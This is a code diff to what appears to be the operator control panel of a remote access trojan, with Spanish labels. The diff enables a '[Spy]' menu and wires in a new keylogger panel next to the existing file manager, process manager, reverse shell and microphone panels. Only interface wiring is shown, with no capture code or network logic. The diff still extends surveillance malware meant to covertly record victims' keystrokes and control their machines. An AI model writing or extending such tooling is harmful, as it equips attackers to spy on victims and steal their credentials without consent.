@@ -1,6 +1,7 @@
 #include "frame_client.hpp"
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
+#include "panel_keylogger.hpp"
 #include "server.hpp"
 #include "misc.hpp"
 
@@ -56,7 +57,7 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
     
     wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
-    //wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
+    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
     //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));
 
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
@@ -65,8 +66,8 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
 
     //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
 
-    /*this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
-    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
+    this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
+    /*this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     
     this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
@@ -154,6 +155,10 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
 
         if (wStr == "Admin de Procesos") {
             this->p_Notebook->AddPage(new panelProcessManager(this), wStr, true);
+        }
+
+        if (wStr == "Keylogger") {
+            this->p_Notebook->AddPage(new panelKeylogger(this), wStr, true);
         }
         
         if (wStr == "Microfono") {
@@ -259,6 +264,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         event.Skip();
     }
 }
+
 
 //Microfono
 panelMicrophone::panelMicrophone(wxWindow* pParent) :
